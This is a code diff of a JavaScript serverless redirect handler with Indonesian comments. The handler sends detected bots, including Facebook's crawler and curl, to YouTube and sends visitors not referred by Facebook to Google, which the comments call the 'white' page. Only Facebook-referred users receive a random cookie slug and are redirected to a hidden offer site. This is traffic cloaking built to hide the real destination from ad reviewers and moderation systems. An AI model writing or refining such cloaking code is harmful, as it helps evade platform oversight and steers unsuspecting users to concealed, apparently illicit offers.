@@ -3,8 +3,9 @@ export default async function handler(req, res) {
   const ua = (req.headers["user-agent"] || "").toLowerCase();
   const referer = (req.headers["referer"] || "").toLowerCase();
   const url = new URL(req.url, `https://${req.headers.host}`);
-
   const path = url.pathname;
+
+  const cookies = req.headers.cookie || "";
 
   // ===== DETEKSI =====
   const isBot =
@@ -15,42 +16,47 @@ export default async function handler(req, res) {
     ua.includes("meta-externalagent") ||
     ua.includes("curl");
 
-const isFB =
-  referer.includes("facebook");
+  const isFB =
+    referer.includes("facebook");
 
-  // ===== ROOT DOMAIN =====
+  // ===== ROOT =====
   if (path === "/") {
 
-    // BOT → WHITE
+    // BOT → YOUTUBE
     if (isBot) {
       return res.writeHead(301, {
         Location: "https://www.youtube.com/"
       }).end();
     }
 
-    // NON FB → WHITE
+    // NON FB → GOOGLE
     if (!isFB) {
       return res.writeHead(301, {
         Location: "https://www.google.com/"
       }).end();
     }
 
-    // USER FB → GENERATE SLUG
-    const slug = "pusat-" + Math.random().toString(36).substring(2, 10);
+    // ===== COOKIE SLUG =====
+    let slug = null;
+
+    if (cookies.includes("slug=")) {
+      slug = cookies.split("slug=")[1].split(";")[0];
+    }
+
+    if (!slug) {
+      slug = "pusat-" + Math.random().toString(36).substring(2, 10);
+    }
 
     return res.writeHead(302, {
       Location: "/" + slug,
-      "Set-Cookie": "visitor=real; path=/;"
+      "Set-Cookie": `slug=${slug}; path=/; max-age=86400`
     }).end();
   }
 
-  // ===== SLUG PAGE =====
+  // ===== SLUG =====
   if (path !== "/") {
-
-    // redirect ke offer
     return res.writeHead(302, {
-      Location: "https://hehehe.pusat4daksi.org/"
+      Location: "https://targetlu.com/"
     }).end();
   }
-
 }
